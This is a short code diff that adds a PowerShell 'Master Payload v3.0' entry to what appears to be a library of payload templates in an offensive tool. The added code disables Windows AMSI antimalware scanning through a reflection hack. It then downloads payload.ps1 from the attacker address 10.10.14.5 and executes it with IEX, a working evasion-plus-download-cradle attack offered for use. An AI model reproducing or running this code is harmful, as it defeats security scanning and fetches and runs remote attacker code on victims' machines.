@@ -235,4 +235,19 @@ func main() {
     cmd.Run()
 }`,
   },
+  {
+    id: 'ps-master-v3',
+    name: '⚡ Master Payload v3.0 (AMSI + Stealth IEX)',
+    language: 'powershell',
+    icon: '🏴',
+    code: `# Master Payload v3.0 — AMSI Bypass + Stealth IEX + Download Cradle
+# Step 1: AMSI Bypass (strings will be auto-obfuscated)
+[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
+
+# Step 2: Download Cradle with Stealth IEX
+$url = "http://10.10.14.5/payload.ps1"
+$wc = New-Object System.Net.WebClient
+$data = $wc.DownloadString($url)
+IEX($data)`,
+  },
 ]
